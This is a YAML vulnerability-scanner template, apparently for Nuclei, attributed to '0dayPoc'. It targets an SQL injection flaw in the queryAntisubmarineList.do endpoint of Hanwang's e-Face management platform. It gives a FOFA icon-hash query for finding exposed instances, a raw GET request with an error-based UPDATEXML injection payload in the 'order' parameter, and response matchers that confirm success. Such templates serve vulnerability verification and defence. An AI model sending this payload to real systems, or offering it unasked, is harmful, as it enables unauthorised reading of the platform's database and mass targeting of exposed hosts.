id: hanwang-faceid-queryantisubmarine-sql

info:
  name: "汉王e脸通综合管理平台 queryAntisubmarineList.do 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="1380907357"
          通过构造恶意负载触发SQL查询逻辑异常，验证/manage/antisubmarine/queryAntisubmarineList.do接口是否存在SQL注入漏洞。攻击者可利用此漏洞绕过输入验证机制，执行任意SQL语句实现数据库敏感信息获取。
  tags: 汉王e脸通综合管理平台

http:
- raw:
  - |
    GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'e10adc3949'
